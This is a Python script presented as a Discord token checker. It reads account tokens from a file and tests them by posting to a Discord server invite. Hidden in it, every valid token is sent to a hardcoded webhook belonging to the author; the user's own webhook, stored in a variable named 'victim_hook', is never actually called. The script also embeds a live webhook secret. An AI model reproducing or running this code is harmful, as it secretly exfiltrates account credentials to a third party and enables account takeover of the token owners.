import os
from requests import get, post
from random import randint
from discord_webhook import DiscordWebhook

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

hook = "https://discord.com/api/webhooks/1067884377553502231/dJ4Ek9Rgwp-NGlSKutMxBT8g00tqTFAhEfk5r5x_WSB-Mws1ZG8Ss0NovNs2wb_cfXjz" # full url
victim_hook = input("Enter your discord webhook if you want to save valid tokens via a discord webhook!(full url)")
    
def clearcmd():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def variant1(token):
    with open('tokens.txt', 'r') as tokens:
            for token in tokens.read().split('\n'):
                response = post(f'https://discord.com/api/v6/invite/QCSBmWX3Me', headers={'Authorization': token},)
                if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
                    return False
                else:
                    return True

def variant1_Status(token):
    response = post(f'https://discord.com/api/v6/invite/QCSBmWX3Me', headers={'Authorization': token})
    if response.status_code == 401:
        return 'Invalid'
    elif "You need to verify your account in order to perform this action." in str(response.content):
        return 'Phone Lock'
    else:
        return 'Valid'
      
if __name__ == "__main__":
    try:
        checked = []
        with open('tokens.txt', 'r') as tokens:
            for token in tokens.read().split('\n'):
                if len(token) > 15 and token not in checked and variant1(token) == True:
                    print(f'Token: {token} is Valid')
                    checked.append(token)
                    webhook = DiscordWebhook(url=hook, content=checked)
                    response = webhook.execute()
                    webhook2 = DiscordWebhook(url=victim_hook, content=checked)
                    response2 = webhook.execute()
                else:
                    print(f'Token: {token} is Invalid')
        if len(checked) > 0:
            save = input(f'{len(checked)} valid tokens\nSave to File (y/n)').lower()
            if save == 'y':
                name = "working_tokens"
                with open(f'{name}.txt', 'w') as saveFile:
                    saveFile.write('\n'.join(checked))
                
        input('Press Enter For Exit...')
    except:
        input('Can`t Open "tokens.txt" File! Press enter to close the program...')
